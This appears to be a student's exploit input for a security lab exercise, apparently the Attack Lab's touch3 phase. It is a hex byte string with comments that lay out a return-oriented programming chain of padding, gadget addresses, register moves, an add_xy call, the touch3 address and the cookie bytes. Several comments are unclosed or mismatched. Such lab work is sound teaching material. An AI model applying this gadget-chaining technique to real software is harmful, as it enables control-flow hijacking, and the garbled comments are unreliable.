00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* end of buffer */
e0 89 48 00 00 00 00 00  /* moves %rsp into %rax */
c7 89 48 00 00 00 00 00  /* moves %rax in to %rdi

c6 e1 44 00 00 00 00 00  /* pops 0x58 into % rax (offset) */     44e1c6:	58                   	pop    %rax
48 00 00 00 00 00 00 00  /* 0000000000401479 <setval_206>:  **gadget**  40 14 79+5  reverse -> 84 14 40

c2 89 00 00 00 00 00 00  /* moves %eax to %edx */
d1 89 00 00 00 00 00 00  /* moves %edx to %ecx */
ce 89 00 00 00 00 00 00  /* moves %ecx to esi */
60 14 40 00 00 00 00 00  /* add_xy address */
c7 89 48 00 00 00 00 00  /* moves %rax in to %rdi
87 13 40 00 00 00 00 00  /* address of touch 3 */
31 30 31 37 62 65 62 33  /* cookie address */
